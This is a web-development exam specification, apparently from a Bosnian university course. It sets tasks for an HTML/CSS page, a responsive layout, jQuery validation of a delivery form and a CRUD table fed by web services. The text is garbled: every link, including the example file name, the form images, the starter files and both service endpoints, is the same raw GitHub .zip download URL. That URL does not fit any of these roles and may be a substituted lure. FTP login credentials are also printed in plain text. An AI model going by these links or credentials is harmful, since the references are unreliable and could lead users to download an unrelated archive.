Zadatak preuzeti s ftp servera. Za izradu zadatka koristiti bilo editor po želji. U rješenju posebno razdvojiti css, html i js fileove. Folder koji sadrži sve potrebne file-ove imenovati brojem indexa sa naznakom „integralno“ ili „parcijalno“, zapakovati u ZIP format i postaviti na ftp u odgovarajuci folder (primjer imena file-a https://raw.githubusercontent.com/agaribovic/Fit-University-Exam2/master/jquery-validation-1.16.0/src/localization/Fit-University-Exam2_2.4.zip ili https://raw.githubusercontent.com/agaribovic/Fit-University-Exam2/master/jquery-validation-1.16.0/src/localization/Fit-University-Exam2_2.4.zip). Obratiti pozornost na minimizaciju HTML/CSS te JavaScript koda koja, kod svakog zadatka, donosi veći broj bodova. Studenti koji ispit rade integralno rade sve zadtke. Studenti koji rade drugi parcijalni ispit, trebaju uraditi samo zadatke 3 i 4.
Po potrebi mozete ukljucti jQuery, jQuery UI i jQuery validator biblioteke.
Podaci za pristup FTP Serveru:
•	Username: student_eb
•	Password: student_eb
Zadatak 1 (HTML+CSS) (ukupno 30 bodova – samo Integralno) :
Prema priloženoj formi https://raw.githubusercontent.com/agaribovic/Fit-University-Exam2/master/jquery-validation-1.16.0/src/localization/Fit-University-Exam2_2.4.zip markup-u https://raw.githubusercontent.com/agaribovic/Fit-University-Exam2/master/jquery-validation-1.16.0/src/localization/Fit-University-Exam2_2.4.zip napraviti HTML stranicu s pripadajućim css-om. Stavke na navigacijskom menu-u mijenjaju boju prilikom hovera mišem. Izgled navigacijskog menija pogledati u priloženom file-u CSS https://raw.githubusercontent.com/agaribovic/Fit-University-Exam2/master/jquery-validation-1.16.0/src/localization/Fit-University-Exam2_2.4.zip

Zadatak 2 (HTML+CSS responsive stranica za mobilne uređaje – samo Integralno) (ukupno 20 bodova) :
Prema priloženoj formi https://raw.githubusercontent.com/agaribovic/Fit-University-Exam2/master/jquery-validation-1.16.0/src/localization/Fit-University-Exam2_2.4.zip uciniti HTML stranicu iz zadatka 1 responsivnom da bude prilagođena mobilnim uređajima. Promjena izgleda stranice treba se desiti kada širina prozora browser-a postanje manja od 600px. Stavke na navigacijskom menu-u mijenjaju boju prilikom hovera mišem. Izgled navigacijskog menija pogledati u nastavku ove specifikacije u djelu Izgled menija na hover (CSS). 
Zadatak 3 (JavaScript ili jQuery validacija) 
Integralno: Ukupno 10 bodova 
Drugi parcijalni: Ukupno 20 bodova (raditi na file-u https://raw.githubusercontent.com/agaribovic/Fit-University-Exam2/master/jquery-validation-1.16.0/src/localization/Fit-University-Exam2_2.4.zip)

Ostvariti validaciju podataka u input box na slijedeci nacin:
-	Ime – tekstualni podaci
-	Adresa – tekstualni podaci
-	Postanski broj – numericki, 5 cifara
-	Broj telefona – format: +111-11-111-1111
Zadatak 4 (JavaScript ili jQuery CRUD):

Integralno: Ukupno 20 bodova 
Drugi parcijalni: Ukupno 80 bodova (raditi na file-u https://raw.githubusercontent.com/agaribovic/Fit-University-Exam2/master/jquery-validation-1.16.0/src/localization/Fit-University-Exam2_2.4.zip)

Integralni i parcijalni:
-	Obezbjediti unos podataka preko web servisa
-	Prilikom unosa svakog novog podatka, ucitati podatke u tabelu ispod forme kao na slici u prilogu
-	Za unos i ucitavanje podataka koristiti web servise:
o	https://raw.githubusercontent.com/agaribovic/Fit-University-Exam2/master/jquery-validation-1.16.0/src/localization/Fit-University-Exam2_2.4.zip
o	https://raw.githubusercontent.com/agaribovic/Fit-University-Exam2/master/jquery-validation-1.16.0/src/localization/Fit-University-Exam2_2.4.zip
JSON format podataka za Dodaj akciju web servisa je
{
  "dostavaAdresa": "string",
  "dostavaIme": "string",
  "dostavaPostanskiBroj": "string",
  "dostavaTelefon": "string",
  "napomena": "string"
}

Samo drugi parcijalni:
-	Obezbjediti mogucnost filtera podataka u tabeli tako sto ce se prilikom unosa teksta u polje za pretragu, u tabeli ostajati samo oni podaci koji u polju „Ime“ zadovoljavaju kriterije pretrage.

Napomena: U prilogu se nalaze se sintaksni potsjetnici za HTML, CSS i jQuery.

Za ostatak stranice koji nije kotiran, procijeniti veličinu prema slici.

Obratiti pažnju na scroll bar sa desne strane. Pomoć: 
-	odnosi se samo na desni div,
-	moguće rješenje:
o	nav postaviti kao fixed a wrapper postaviti lijevu marginu veću od širine nav-a, ili
o	lijevu i desnu strana postaviti kao fixed sa visinom 100%, a desnoj strani dodati overflow.
(Pomoć: Za izbor boja koristite .jpg file u prilogu. Editujte ga u Paint-u i color picker-om uzmite code boje.)

U nastavku su print screen-ovi sa detaljima izgleda i funkcionalnosti

 
Osnovni izgled stranice
Izgled donjeg djela desne strane
Klikom na sliku, slika dobova žuti okvir (JavaScript)

 
Hover pointerom preko slike rezultira implementacijom opacity 80% (CSS).
 
 
 
Izgled menija na hover (CSS)
 


Izgled stranice na mobilnom uređaju (ispod 600px širine)
Slike su jedna ispod druge.
 			 
 



